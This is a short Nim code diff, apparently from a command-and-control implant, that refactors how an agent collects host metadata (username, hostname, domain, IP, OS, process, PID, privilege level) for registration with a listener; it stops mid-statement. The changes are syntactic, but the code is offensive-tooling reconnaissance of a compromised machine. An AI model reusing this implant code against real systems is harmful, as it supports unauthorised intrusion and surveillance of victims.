@@ -209,12 +209,12 @@ proc collectAgentMetadata*(config: AgentConfig): AgentRegistrationData =
         agentPublicKey: config.agentPublicKey,
         metadata: AgentMetadata(
             listenerId: uuidToUint32(config.listenerId),
-            username: getUsername().toBytes(),
-            hostname: getHostname().toBytes(),
-            domain: getDomain().toBytes(),
-            ip: getIPv4Address().toBytes(),
-            os: getOSVersion().toBytes(),
-            process: getProcessExe().toBytes(),
+            username: string.toBytes(getUsername()),
+            hostname: string.toBytes(getHostname()),
+            domain: string.toBytes(getDomain()),
+            ip: string.toBytes(getIPv4Address()),
+            os: string.toBytes(getOSVersion()),
+            process: string.toBytes(getProcessExe()),
             pid: cast[uint32](getProcessId()),
             isElevated: cast[uint8](isElevated()),
             sleep: cast[uint32](config.sleep)
@@ -223,7 +223,7 @@ proc collectAgentMetadata*(config: AgentConfig): AgentRegistrationData =
 
 proc serializeRegistrationData*(config: AgentConfig, data: var AgentRegistrationData): seq[byte] = 
 
-    var packer = initPacker()
+    var packer = Packer.init()
 
     # Serialize registration data
     packer 
